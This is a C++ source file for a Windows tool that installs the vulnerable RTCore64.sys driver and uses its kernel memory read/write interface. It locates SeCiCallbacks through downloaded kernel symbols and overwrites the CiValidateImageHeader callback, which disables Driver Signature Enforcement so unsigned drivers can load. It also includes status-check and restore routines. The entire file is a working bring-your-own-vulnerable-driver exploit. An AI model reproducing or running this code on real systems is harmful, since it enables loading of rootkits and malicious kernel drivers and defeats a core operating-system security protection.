#include "DrvCore.h"
#include "ConfigManager.h"
#include "ResourceInstaller.h"
#include <iostream>
#include <vector>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "version.lib")

bool DrvLoader::Initialize() {
    originalCallback = ConfigManager::LoadOriginalCallbackFromRegistry();
    
    if (originalCallback) {
        std::wcout << L"[+] Found previous patch state in registry\n";
        std::wcout << L"[+] Original callback: 0x" << std::hex << std::uppercase 
                   << *originalCallback << std::dec << L"\n";
    } else {
        std::wcout << L"[*] No previous patch state found - system appears unpatched\n";
    }
    
    if (!symbolDownloader.Initialize()) {
        std::wcout << L"[-] Failed to initialize symbol downloader\n";
        return false;
    }
    
    return true;
}

void DrvLoader::Cleanup() {
    if (hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(hDriver);
        hDriver = INVALID_HANDLE_VALUE;
    }
}

bool DrvLoader::WriteMemory32(uint64_t address, uint32_t value) {
    if (hDriver == INVALID_HANDLE_VALUE) return false;
    
    RTC_MEMORY_WRITE writePacket{};
    writePacket.Address = address;
    writePacket.Size = sizeof(uint32_t);
    writePacket.Value = value;
    
    DWORD bytesReturned = 0;
    return DeviceIoControl(hDriver, RTC_IOCTL_MEMORY_WRITE, &writePacket, sizeof(writePacket), 
                          &writePacket, sizeof(writePacket), &bytesReturned, nullptr);
}

bool DrvLoader::WriteMemory64(uint64_t address, uint64_t value) {
    return WriteMemory32(address, static_cast<uint32_t>(value & 0xFFFFFFFF)) && 
           WriteMemory32(address + 4, static_cast<uint32_t>((value >> 32) & 0xFFFFFFFF));
}

std::optional<uint32_t> DrvLoader::ReadMemory32(uint64_t address) {
    if (hDriver == INVALID_HANDLE_VALUE) return std::nullopt;
    
    RTC_MEMORY_READ readPacket{};
    readPacket.Address = address;
    readPacket.Size = sizeof(uint32_t);
    
    DWORD bytesReturned = 0;
    if (!DeviceIoControl(hDriver, RTC_IOCTL_MEMORY_READ, &readPacket, sizeof(readPacket), 
                        &readPacket, sizeof(readPacket), &bytesReturned, nullptr))
        return std::nullopt;
    
    return readPacket.Value;
}

std::optional<uint64_t> DrvLoader::ReadMemory64(uint64_t address) {
    auto low = ReadMemory32(address);
    auto high = ReadMemory32(address + 4);
    if (!low || !high) return std::nullopt;
    
    return (static_cast<uint64_t>(*high) << 32) | *low;
}

std::optional<uint64_t> DrvLoader::GetNtoskrnlBase() {
    std::vector<LPVOID> drivers(1024);
    DWORD needed = 0;
    
    if (!EnumDeviceDrivers(drivers.data(), static_cast<DWORD>(drivers.size() * sizeof(LPVOID)), &needed))
        return std::nullopt;
    
    drivers.resize(needed / sizeof(LPVOID));
    
    for (const auto& driver : drivers) {
        WCHAR driverName[MAX_PATH];
        if (GetDeviceDriverBaseNameW(driver, driverName, MAX_PATH) && wcscmp(driverName, L"ntoskrnl.exe") == 0) {
            uint64_t base = reinterpret_cast<uint64_t>(driver);
            std::wcout << L"[+] ntoskrnl.exe base: 0x" << std::hex << base << std::dec << L"\n";
            return base;
        }
    }
    
    return std::nullopt;
}

bool DrvLoader::GetSymbolOffsets(uint64_t* seCiCallbacks, uint64_t* safeFunction) {
    WCHAR systemRoot[MAX_PATH];
    GetSystemDirectoryW(systemRoot, MAX_PATH);
    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
    
    // Try cached mini-PDB first
    if (ConfigManager::LoadOffsetsFromWindowsMiniPdb(seCiCallbacks, safeFunction)) {
        std::wcout << L"[+] Using cached offsets from mini-PDB\n";
        return true;
    }
    
    // Download symbols if no cache
    std::wcout << L"[*] Downloading kernel symbols...\n";
    if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) {
        std::wcout << L"[-] Failed to download symbols for ntoskrnl.exe\n";
        return false;
    }
    
    auto seCiOffset = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SeCiCallbacks");
    auto zwFlushOffset = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"ZwFlushInstructionCache");
    
    if (!seCiOffset || !zwFlushOffset) {
        std::wcout << L"[-] Failed to get symbol offsets\n";
        return false;
    }
    
    *seCiCallbacks = *seCiOffset;
    *safeFunction = *zwFlushOffset;
    
    // Create mini-PDB for future use
    ConfigManager::CreateWindowsMiniPdb(*seCiCallbacks, *safeFunction);
    
    return true;
}

std::optional<uint64_t> DrvLoader::GetKernelSymbolOffset(const std::wstring& symbolName) {
    WCHAR systemRoot[MAX_PATH];
    GetSystemDirectoryW(systemRoot, MAX_PATH);
    
    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
    
    if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) {
        std::wcout << L"[-] Failed to download symbols for ntoskrnl.exe\n";
        return std::nullopt;
    }
    
    return symbolDownloader.GetSymbolOffset(ntoskrnlPath, symbolName);
}

bool DrvLoader::CheckDriverFileExists() {
    std::wstring driverPath = ConfigManager::GetDriverPath();
    DWORD fileAttrib = GetFileAttributesW(driverPath.c_str());
    
    if (fileAttrib == INVALID_FILE_ATTRIBUTES) {
        std::wcout << L"[-] RTCore64.sys not found in System32\\drivers\n";
        std::wcout << L"[*] Attempting to install driver from embedded resource...\n";
        
        if (!ResourceInstaller::InstallDriverFromResource()) {
            std::wcout << L"[-] Failed to install driver from resource\n";
            return false;
        }
        
        fileAttrib = GetFileAttributesW(driverPath.c_str());
        if (fileAttrib == INVALID_FILE_ATTRIBUTES) {
            std::wcout << L"[-] Driver installation failed - file not found after install\n";
            return false;
        }
    }
    
    std::wcout << L"[+] Driver file found: " << driverPath << L"\n";
    return true;
}

bool DrvLoader::StopAndRemoveDriver() {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        std::wcout << L"[-] Failed to open Service Control Manager (error: " << GetLastError() << L")\n";
        return false;
    }
    
    SC_HANDLE hService = OpenServiceW(hSCM, L"RTCore64", SERVICE_ALL_ACCESS);
    if (hService) {
        SERVICE_STATUS serviceStatus;
        if (ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
            std::wcout << L"[+] RTCore64 driver stopped\n";
        } else {
            DWORD err = GetLastError();
            if (err != ERROR_SERVICE_NOT_ACTIVE) {
                std::wcout << L"[!] Warning: Failed to stop driver (error: " << err << L")\n";
            }
        }
        
        if (DeleteService(hService)) {
            std::wcout << L"[+] RTCore64 service deleted from registry\n";
        } else {
            std::wcout << L"[-] Failed to delete service (error: " << GetLastError() << L")\n";
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return false;
        }
        
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCM);
    return true;
}

bool DrvLoader::InstallAndStartDriver() {
    if (!CheckDriverFileExists()) {
        return false;
    }
    StopAndRemoveDriver();
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        std::wcout << L"[-] Failed to open Service Control Manager (error: " << GetLastError() << L")\n";
        return false;
    }
    
    std::wstring driverPath = L"System32\\drivers\\RTCore64.sys";
    
    SC_HANDLE hService = CreateServiceW(
        hSCM,
        L"RTCore64",
        L"RTCore64",
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_SYSTEM_START,
        SERVICE_ERROR_NORMAL,
        driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );
    
    if (!hService) {
        DWORD err = GetLastError();
        std::wcout << L"[-] Failed to create RTCore64 service (error: " << err << L")\n";
        CloseServiceHandle(hSCM);
        return false;
    }
    
    std::wcout << L"[+] RTCore64 service created successfully\n";
    
    if (!StartServiceW(hService, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            std::wcout << L"[-] Failed to start RTCore64 driver (error: " << err << L")\n";
            DeleteService(hService);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return false;
        }
    }
    
    std::wcout << L"[+] RTCore64 driver started successfully\n";
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    return true;
}

bool DrvLoader::TryLoadOffsetsFromCache(uint64_t* seCiCallbacks, uint64_t* safeFunction) {
    return ConfigManager::LoadOffsetsFromWindowsMiniPdb(seCiCallbacks, safeFunction);
}

bool DrvLoader::CheckDSEStatus(bool& isPatched) {
    std::wcout << L"\n[=== Checking DSE Status ===]\n\n";
    
    uint64_t seCiCallbacksOffset = 0;
    uint64_t zwFlushInstructionCacheOffset = 0;
    bool usedCache = false;
    
    // Try to use cached mini-PDB first (no symbol download needed!)
    if (TryLoadOffsetsFromCache(&seCiCallbacksOffset, &zwFlushInstructionCacheOffset)) {
        std::wcout << L"[+] Using cached offsets from mini-PDB - no symbol download needed!\n";
        usedCache = true;
    } else {
        std::wcout << L"[*] No cached offsets found, downloading symbols...\n";
        
        // Download symbols WITHOUT driver installation
        WCHAR systemRoot[MAX_PATH];
        GetSystemDirectoryW(systemRoot, MAX_PATH);
        std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
        
        if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) {
            std::wcout << L"[-] Failed to download symbols for ntoskrnl.exe\n";
            return false;
        }
        
        auto seCiCallbacksOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SeCiCallbacks");
        auto zwFlushInstructionCacheOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"ZwFlushInstructionCache");
        
        if (!seCiCallbacksOpt || !zwFlushInstructionCacheOpt) {
            std::wcout << L"[-] Failed to get required symbol offsets from PDB\n";
            return false;
        }
        
        seCiCallbacksOffset = *seCiCallbacksOpt;
        zwFlushInstructionCacheOffset = *zwFlushInstructionCacheOpt;
        
        // Create mini-PDB for future use (only on first run)
        ConfigManager::CreateWindowsMiniPdb(seCiCallbacksOffset, zwFlushInstructionCacheOffset);
    }
    
    // NOW install driver for memory operations (required for status check)
    if (!InstallAndStartDriver()) {
        return false;
    }
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] Failed to open RTCore64 driver\n";
        StopAndRemoveDriver();
        return false;
    }
    std::wcout << L"[+] RTCore64 driver opened successfully\n";
    
    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    uint64_t seCiCallbacks = *ntBase + seCiCallbacksOffset;
    uint64_t safeFunction = *ntBase + zwFlushInstructionCacheOffset;
    uint64_t callbackAddress = seCiCallbacks + 0x20;
    
    auto currentCallback = ReadMemory64(callbackAddress);
    if (!currentCallback) {
        std::wcout << L"[-] Failed to read callback address\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    isPatched = (*currentCallback == safeFunction);
    
    std::wcout << L"[+] Current CiValidateImageHeader: 0x" << std::hex << *currentCallback << std::dec << L"\n";
    std::wcout << L"[+] Safe function address: 0x" << std::hex << safeFunction << std::dec << L"\n";
    std::wcout << L"[+] DSE Status: " << (isPatched ? L"PATCHED (disabled)" : L"ACTIVE (enabled)") << L"\n";
    
    if (!usedCache) {
        std::wcout << L"\n[*] Saving current offsets...\n";
        
        bool driversIniUpdated = ConfigManager::UpdateDriversIni(seCiCallbacksOffset, zwFlushInstructionCacheOffset);
        
        WCHAR systemRoot[MAX_PATH];
        GetSystemDirectoryW(systemRoot, MAX_PATH);
        std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
        
        DWORD verHandle = 0;
        DWORD verSize = GetFileVersionInfoSizeW(ntoskrnlPath.c_str(), &verHandle);
        std::wstring buildInfo = L"Unknown";
        
        if (verSize > 0) {
            std::vector<BYTE> verData(verSize);
            if (GetFileVersionInfoW(ntoskrnlPath.c_str(), 0, verSize, verData.data())) {
                VS_FIXEDFILEINFO* pFileInfo = nullptr;
                UINT len = 0;
                if (VerQueryValueW(verData.data(), L"\\", (LPVOID*)&pFileInfo, &len)) {
                    wchar_t ver[64];
                    swprintf_s(ver, L"%d.%d.%d.%d",
                        HIWORD(pFileInfo->dwFileVersionMS),
                        LOWORD(pFileInfo->dwFileVersionMS),
                        HIWORD(pFileInfo->dwFileVersionLS),
                        LOWORD(pFileInfo->dwFileVersionLS));
                    buildInfo = ver;
                }
            }
        }
        
        bool registrySaved = ConfigManager::SaveOffsetsToRegistry(seCiCallbacksOffset, zwFlushInstructionCacheOffset, buildInfo);
        
        std::wcout << L"\n[*] Offset save summary:\n";
        if (driversIniUpdated) {
            std::wcout << L"    [+] drivers.ini updated\n";
        } else {
            std::wcout << L"    [-] drivers.ini not found or failed to update\n";
        }
        
        if (registrySaved) {
            std::wcout << L"    [+] Registry updated (HKCU\\Software\\drvloader)\n";
        } else {
            std::wcout << L"    [-] Registry update failed\n";
        }
    }
    
    Cleanup();
    StopAndRemoveDriver();
    
    return true;
}

bool DrvLoader::BypassDSE() {
    std::wcout << L"\n[=== DSE Bypass - Single Callback Patch ===]\n\n";
    
    std::wcout << L"[1/6] Installing and starting RTCore64 driver...\n";
    if (!InstallAndStartDriver()) {
        return false;
    }
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] Failed to open RTCore64 driver\n";
        StopAndRemoveDriver();
        return false;
    }
    std::wcout << L"[+] RTCore64 driver opened successfully\n";
    
    std::wcout << L"[2/6] Downloading kernel symbols from Microsoft Symbol Server...\n";
    auto seCiCallbacksOffset = GetKernelSymbolOffset(L"SeCiCallbacks");
    auto zwFlushInstructionCacheOffset = GetKernelSymbolOffset(L"ZwFlushInstructionCache");
    
    if (!seCiCallbacksOffset || !zwFlushInstructionCacheOffset) {
        std::wcout << L"[-] Failed to get required symbol offsets from PDB\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[3/6] Locating ntoskrnl.exe in kernel memory...\n";
    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[4/6] Calculating target addresses using dynamic PDB symbols...\n";
    uint64_t seCiCallbacks = *ntBase + *seCiCallbacksOffset;
    uint64_t safeFunction = *ntBase + *zwFlushInstructionCacheOffset;
    
    std::wcout << L"[+] SeCiCallbacks table located at: 0x" << std::hex << seCiCallbacks << std::dec << L"\n";
    std::wcout << L"[+] Safe function (ZwFlushInstructionCache) at: 0x" << std::hex << safeFunction << std::dec << L"\n";
    
    std::wcout << L"[5/6] Patching CiValidateImageHeader callback...\n";
    
    uint64_t callbackToPatch = seCiCallbacks + 0x20;
    
    auto currentCallback = ReadMemory64(callbackToPatch);
    if (!currentCallback) {
        std::wcout << L"[-] Failed to read current callback address\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    if (*currentCallback == safeFunction) {
        std::wcout << L"[!] Callback already patched - no changes needed\n";
        Cleanup();
        StopAndRemoveDriver();
        return true;
    }
    
    originalCallback = *currentCallback;
    std::wcout << L"[*] Original CiValidateImageHeader: 0x" << std::hex << *currentCallback << std::dec << L"\n";
    
    if (!ConfigManager::SaveOriginalCallbackToRegistry(*originalCallback)) {
        std::wcout << L"[-] CRITICAL: Failed to save original callback to registry!\n";
        std::wcout << L"[-] Cannot proceed - restoration would be impossible\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[+] Original callback backed up successfully\n";
    std::wcout << L"[*] Replacing with safe function: 0x" << std::hex << safeFunction << std::dec << L"\n";
    
    if (!WriteMemory64(callbackToPatch, safeFunction)) {
        std::wcout << L"[-] Failed to write new callback address\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    auto newCallback = ReadMemory64(callbackToPatch);
    if (!newCallback || *newCallback != safeFunction) {
        std::wcout << L"[-] Patch verification failed - memory write unsuccessful\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[+] DSE bypass completed successfully!\n";
    std::wcout << L"[+] CiValidateImageHeader has been replaced with ZwFlushInstructionCache\n";
    std::wcout << L"[+] Unsigned drivers can now be loaded\n";
    
    std::wcout << L"[6/6] Cleaning up - stopping and removing driver...\n";
    Cleanup();
    StopAndRemoveDriver();
    
    std::wcout << L"[+] System cleanup completed - no driver instances running\n";
    
    return true;
}

bool DrvLoader::RestoreDSE() {
    std::wcout << L"\n[=== DSE Restore - Reverting Callback Patch ===]\n\n";
    
    if (!originalCallback) {
        std::wcout << L"[-] No original callback found in registry\n";
        std::wcout << L"[!] Cannot restore - original address unknown\n";
        std::wcout << L"\n";
        std::wcout << L"Possible reasons:\n";
        std::wcout << L"1. System was never patched with this tool\n";
        std::wcout << L"2. Registry state was deleted/corrupted\n";
        std::wcout << L"3. Windows was updated and offset changed\n";
        std::wcout << L"\n";
        std::wcout << L"Solutions:\n";
        std::wcout << L"- If DSE is currently disabled: Check status first (it will auto-fix)\n";
        std::wcout << L"- If unsure: Reboot (this will restore DSE automatically)\n";
        std::wcout << L"- Registry location: HKCU\\Software\\drvloader\\LatestState\n";
        return false;
    }
    
    std::wcout << L"[1/6] Installing and starting RTCore64 driver...\n";
    if (!InstallAndStartDriver()) {
        return false;
    }
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] Failed to open RTCore64 driver\n";
        StopAndRemoveDriver();
        return false;
    }
    std::wcout << L"[+] RTCore64 driver opened successfully\n";
    
    std::wcout << L"[2/6] Downloading kernel symbols from Microsoft Symbol Server...\n";
    auto seCiCallbacksOffset = GetKernelSymbolOffset(L"SeCiCallbacks");
    auto zwFlushInstructionCacheOffset = GetKernelSymbolOffset(L"ZwFlushInstructionCache");
    
    if (!seCiCallbacksOffset || !zwFlushInstructionCacheOffset) {
        std::wcout << L"[-] Failed to get required symbol offsets from PDB\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[3/6] Locating ntoskrnl.exe in kernel memory...\n";
    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[4/6] Calculating target addresses...\n";
    uint64_t seCiCallbacks = *ntBase + *seCiCallbacksOffset;
    uint64_t safeFunction = *ntBase + *zwFlushInstructionCacheOffset;
    uint64_t callbackAddress = seCiCallbacks + 0x20;
    
    std::wcout << L"[+] SeCiCallbacks table located at: 0x" << std::hex << seCiCallbacks << std::dec << L"\n";
    std::wcout << L"[+] Original callback to restore: 0x" << std::hex << *originalCallback << std::dec << L"\n";
    
    std::wcout << L"[5/6] Restoring original CiValidateImageHeader callback...\n";
    
    auto currentCallback = ReadMemory64(callbackAddress);
    if (!currentCallback) {
        std::wcout << L"[-] Failed to read current callback address\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    if (*currentCallback == *originalCallback) {
        std::wcout << L"[!] Callback already restored - no changes needed\n";
        ConfigManager::ClearPatchStateFromRegistry();
        Cleanup();
        StopAndRemoveDriver();
        return true;
    }
    
    if (*currentCallback != safeFunction) {
        std::wcout << L"[!] Warning: Current callback doesn't match expected patched state\n";
        std::wcout << L"[*] Current: 0x" << std::hex << *currentCallback << std::dec << L"\n";
        std::wcout << L"[*] Expected: 0x" << std::hex << safeFunction << std::dec << L"\n";
    }
    
    std::wcout << L"[*] Current callback: 0x" << std::hex << *currentCallback << std::dec << L"\n";
    std::wcout << L"[*] Restoring to: 0x" << std::hex << *originalCallback << std::dec << L"\n";
    
    if (!WriteMemory64(callbackAddress, *originalCallback)) {
        std::wcout << L"[-] Failed to write original callback address\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    auto restoredCallback = ReadMemory64(callbackAddress);
    if (!restoredCallback || *restoredCallback != *originalCallback) {
        std::wcout << L"[-] Restoration verification failed - memory write unsuccessful\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[+] DSE restore completed successfully!\n";
    std::wcout << L"[+] CiValidateImageHeader has been restored to original address\n";
    std::wcout << L"[+] Driver signature enforcement is now active\n";
    
    ConfigManager::ClearPatchStateFromRegistry();
    
    std::wcout << L"[6/6] Cleaning up - stopping and removing driver...\n";
    Cleanup();
    StopAndRemoveDriver();
    
    std::wcout << L"[+] System cleanup completed - no driver instances running\n";
    
    return true;
}